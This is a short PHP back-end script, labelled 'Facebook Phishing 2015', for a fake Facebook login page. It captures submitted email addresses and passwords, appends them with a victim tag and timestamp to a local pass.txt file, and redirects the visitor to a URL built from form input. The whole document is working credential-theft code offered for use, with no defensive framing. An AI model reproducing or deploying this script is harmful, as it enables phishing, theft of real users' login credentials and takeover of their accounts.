<?php

/**************************************************
//
//	Name: Facebook Phishing 2015 (3 style)
//	Author: Ishtiak Ahmed
//	Script URI: http://goo.gl/JSVRfD
//	Author URI: http://techybd.com
//	License: Free, but you cannot change author name
//	Date: 23 Oct 2015 01:00 AM GMT+06
//
***************************************************/

$email = $_POST['email'];
$password = $_POST['pass'];
$time = date('h:i:s A l d F Y');
$victim = $_POST['victim'];
$style = $_POST['charset_test'];
$redi = $_POST['version'].'&email='.substr($email, 0, -1);
$a = 'Email - '.$email.'
Password - '.$password.'
Victim - '.$victim.'
Style - '.$style.'
Time - '.$time.'
';

$fn = "pass.txt"; // change "pass" if you wish, don't remove .txt
$cont =$a ;
$file = fopen($fn, "a+");
$size = filesize($fn);
fwrite($file, $cont);
fclose($file);

header("Location: $redi");

?>